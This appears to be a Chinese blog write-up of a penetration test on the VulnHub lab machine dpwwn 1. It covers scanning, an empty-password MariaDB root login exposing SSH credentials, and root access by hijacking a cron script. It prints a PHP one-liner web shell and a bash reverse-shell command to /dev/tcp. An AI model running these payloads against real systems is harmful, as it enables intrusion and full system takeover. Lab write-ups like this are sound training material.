+++
date = '2026-11-19T21:06:21+08:00'
draft = false
title = '[VulnHub靶机]dpwwn 1渗透记录'
tags = ['渗透','Vulnhub','Crontab']
categories = ["靶机渗透"]
+++

## 主机发现&端口扫描

攻击机IP: 10.10.10.3  
靶机IP: 10.10.10.21

```shell
┌──(kali㉿kali)-[~/dpwwn1]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.21     00:0c:29:93:02:fa       VMware, Inc.
10.10.10.254    00:50:56:f8:1d:31       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.256 seconds (113.48 hosts/sec). 4 responded
```

探测端口开放情况

```shell
┌──(kali㉿kali)-[~/dpwwn1]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.21
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-19 22:02 +0800
Nmap scan report for 10.10.10.21
Host is up (0.00045s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:93:02:FA (VMware)

Nmap done: 1 IP address (1 host up) scanned in 3.98 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/dpwwn1]
└─$ sudo nmap -sT -sV -sC -O -p22,80,3306 10.10.10.21
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-19 22:02 +0800
Nmap scan report for 10.10.10.21
Host is up (0.00060s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 c1:d3:be:39:42:9d:5c:b4:95:2c:5b:2e:20:59:0e:3a (RSA)
|   256 43:4a:c6:10:e7:17:7d:a0:c0:c3:76:88:1d:43:a1:8c (ECDSA)
|_  256 0e:cc:e3:e1:f7:87:73:a1:03:47:b9:e2:cf:1c:93:15 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
| http-methods:
|_  Potentially risky methods: TRACE
3306/tcp open  mysql   MariaDB 5.5.60
| mysql-info:
|   Protocol: 10
|   Version: 5.5.60-MariaDB
|   Thread ID: 6
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, FoundRows, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ODBCClient, Speaks41ProtocolOld, ConnectWithDatabase, IgnoreSigpipes, SupportsTransactions, InteractiveClient, Speaks41ProtocolNew, LongPassword, LongColumnFlag, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: ,5d|aOI`(C[}%:8F;1&f
|_  Auth Plugin Name: mysql_native_password
MAC Address: 00:0C:29:93:02:FA (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.14 (97%), Linux 3.10 - 4.11 (95%), Linux 5.1 - 5.15 (95%), Linux 3.13 - 3.16 (94%), Linux 3.8 - 3.16 (94%), Linux 4.10 (94%), OpenWrt 19.07 (Linux 4.14) (94%), Linux 2.6.32 (94%), Linux 3.4 - 3.10 (94%), Linux 4.15 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.46 seconds
```

漏洞扫描, 发现/info.php

```shell
┌──(kali㉿kali)-[~/dpwwn1]
└─$ sudo nmap --script=vuln -p22,80,3306 10.10.10.21
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-19 22:03 +0800
Nmap scan report for 10.10.10.21
Host is up (0.00046s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-trace: TRACE is enabled
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum:
|   /info.php: Possible information file
|_  /icons/: Potentially interesting folder w/ directory listing
3306/tcp open  mysql
MAC Address: 00:0C:29:93:02:FA (VMware)

Nmap done: 1 IP address (1 host up) scanned in 31.67 seconds
```

UDP扫描

```shell
┌──(kali㉿kali)-[~/dpwwn1]
└─$ sudo nmap -sU --top-ports 20 10.10.10.21
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-19 22:04 +0800
Nmap scan report for 10.10.10.21
Host is up (0.0010s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown
MAC Address: 00:0C:29:93:02:FA (VMware)

Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds
```

## Web渗透

访问80端口, 发现是Apache在CentOS上的默认页面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/dpwwn1/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

访问/info.php, 是phpinfo页面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/dpwwn1/info.avif)

目录爆破, 一无所获

```shell
┌──(kali㉿kali)-[~/dpwwn1]
└─$ dirsearch -u http://10.10.10.21/

  _|. _ _  _  _  _ _|_    v0.4.4
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25
Wordlist size: 12295

Target: http://10.10.10.21/

[22:10:47] Scanning: 
[22:10:59] 403 -   210B - /cgi-bin/
[22:11:03] 200 -   48KB - /info.php

Task Completed
```

nikto扫描, 发现RFI漏洞

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/dpwwn1/%E5%8F%91%E7%8E%B0RFI.avif)

攻击机开启服务器, 并放置一个一句话木马

```shell
┌──(kali㉿kali)-[~/dpwwn1]
└─$ echo '<?php system($_GET["cmd"]);?>' > shell.php
                                                                                                                                                                       
┌──(kali㉿kali)-[~/dpwwn1]
└─$ python3 -m http.server                                                         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

访问`http://10.10.10.21/info.php?file=http://10.10.10.3:8000/shell.php&cmd=whoami`发现页面没有任何变化, 访问`https://cirt.net/public/rfiinc.txt`才发现是nikto误判了, 因为这里包含的是phpinfo(), 而info.php这个也页面本来就是phpinfo

## MariaDB空密码错误配置

尝试无密码直接登录MariaDB

```shell
┌──(kali㉿kali)-[~/dpwwn1]
└─$ mysql -h 10.10.10.21 -uroot -p
Enter password:
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

这是因为我们的攻击机的MariaDB要求SSL加密, 而靶机不支持, 解决办法是禁用加密

```shell
┌──(kali㉿kali)-[~/dpwwn1]
└─$ mysql -h 10.10.10.21 -uroot -p --ssl=0
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 3
Server version: 5.5.60-MariaDB MariaDB Server

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

成功登录!  
查看数据库

```sql
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| ssh                |
+--------------------+
4 rows in set (0.030 sec)
```

查看ssh库中的表

```sql
MariaDB [(none)]> use ssh;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [ssh]> show tables;
+---------------+
| Tables_in_ssh |
+---------------+
| users         |
+---------------+
1 row in set (0.010 sec)
```

查看users表内容

```sql
MariaDB [ssh]> SELECT * FROM users;
+----+----------+---------------------+
| id | username | password            |
+----+----------+---------------------+
|  1 | mistic   | testP@$$swordmistic |
+----+----------+---------------------+
1 row in set (0.002 sec)
```

发现一组凭据  
使用用户名`mistic`, 密码`testP@$$swordmistic`登录靶机ssh服务

```shell
┌──(kali㉿kali)-[~/dpwwn1]
└─$ ssh mistic@10.10.10.21            
The authenticity of host '10.10.10.21 (10.10.10.21)' can't be established.
ED25519 key fingerprint is: SHA256:gk40nSGfkMrCYAeMyL2l9aCwV/VL5i5mWKrFfowOfH0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.21' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mistic@10.10.10.21's password: 
Last login: Thu Aug  1 14:41:37 2019 from 192.168.30.145
[mistic@dpwwn-01 ~]$
```

## 权限提升

查看当前目录

```shell
[mistic@dpwwn-01 ~]$ pwd
/home/mistic
[mistic@dpwwn-01 ~]$ ls -lah
总用量 16K
drwx------. 2 mistic mistic 100 8月   1 2019 .
drwxr-xr-x. 3 root   root    20 8月   1 2019 ..
-rw-------. 1 mistic mistic   0 8月   1 2019 .bash_history
-rw-r--r--. 1 mistic mistic  18 10月 30 2018 .bash_logout
-rw-r--r--. 1 mistic mistic 193 10月 30 2018 .bash_profile
-rw-r--r--. 1 mistic mistic 231 10月 30 2018 .bashrc
-rwx------. 1 mistic mistic 186 8月   1 2019 logrot.sh
```

查看logrot.sh

```sh
#!/bin/bash
#
#LOGFILE="/var/tmp"
#SEMAPHORE="/var/tmp.semaphore"


while : ; do
  read line
  while [[ -f $SEMAPHORE ]]; do
    sleep 1s
  done
  printf "%s\n" "$line" >> $LOGFILE
done
```

查看自动任务, 发现每隔3分钟会以root身份执行这个脚本

```shell
[mistic@dpwwn-01 ~]$ cat /etc/crontab

SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/3 *  * * *  root  /home/mistic/logrot.sh
```

我们拥有该脚本的写权限, 可以直接将其改造为反弹shell脚本

```shell
[mistic@dpwwn-01 ~]$ echo -e '#!/bin/bash\n/bin/bash -c "/bin/bash -i >&/dev/tcp/10.10.10.3/4444 0>&1"' > logrot.sh
```

等待3分钟, 即可获得反弹shell

```shell
┌──(kali㉿kali)-[~/dpwwn1]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.21] 58452
bash: no job control in this shell
[root@dpwwn-01 ~]# whoami
root
```

查看flag

```shell
[root@dpwwn-01 ~]# cd /root
[root@dpwwn-01 ~]# ls -lah
total 32K
dr-xr-x---.  2 root root  182 Aug  1  2019 .
dr-xr-xr-x. 17 root root  211 Aug  1  2019 ..
-rw-------.  1 root root 1.4K Aug  1  2019 anaconda-ks.cfg
-rw-------.  1 root root   14 Aug  1  2019 .bash_history
-rw-r--r--.  1 root root   18 Dec 28  2013 .bash_logout
-rw-r--r--.  1 root root  176 Dec 28  2013 .bash_profile
-rw-r--r--.  1 root root  176 Dec 28  2013 .bashrc
-rw-r--r--.  1 root root  100 Dec 28  2013 .cshrc
-r-x------.  1 root root  171 Aug  1  2019 dpwwn-01-FLAG.txt
-rw-------.  1 root root    0 Aug  1  2019 .mysql_history
-rw-r--r--.  1 root root  129 Dec 28  2013 .tcshrc
[root@dpwwn-01 ~]# cat dpwwn-01-FLAG.txt

Congratulation! I knew you can pwn it as this very easy challenge. 

Thank you. 


64445777
6e643634 
37303737 
37373665 
36347077 
776e6450 
4077246e
33373336 
36359090
```
